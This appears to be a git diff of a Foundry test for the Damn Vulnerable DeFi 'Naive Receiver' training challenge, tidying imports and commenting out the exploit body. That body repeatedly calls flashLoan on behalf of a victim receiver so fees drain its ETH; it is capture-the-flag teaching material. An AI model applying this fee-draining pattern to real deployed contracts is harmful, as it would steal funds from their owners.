@@ -1,18 +1,17 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
 
-//import {DSTest} from "ds-test/test.sol";
+// https://stermi.medium.com/damn-vulnerable-defi-challenge-2-solution-naive-receiver-341376fdc967
+
 import {Test} from "forge-std/Test.sol";
 import {Utilities} from "../Utilities.sol";
-import {console} from "../Console.sol";
+import {console} from "forge-std/console.sol";
 import {Vm} from "forge-std/Vm.sol";
 
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
 
 contract NaiveReceiver is Test {
-    //Vm internal immutable vm = Vm(HEVM_ADDRESS);
-
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
     uint256 internal constant ETHER_IN_RECEIVER = 10e18;
 
@@ -53,19 +52,23 @@ contract NaiveReceiver is Test {
     }
 
     function testExploit() public {
+
         /** EXPLOIT START **/
 
-        vm.startPrank(attacker);
-        for( uint256 i = 0; i < 10; i++ ) {
-            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
-        }
-        vm.stopPrank();
+        // vm.startPrank(attacker);
+
+        // for( uint256 i = 0; i < 10; i++ ) {
+        //     naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        // }
+
+        // vm.stopPrank();
 
         /** EXPLOIT END **/
-        validation();
+
+        _validation();
     }
 
-    function validation() internal {
+    function _validation() internal {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(
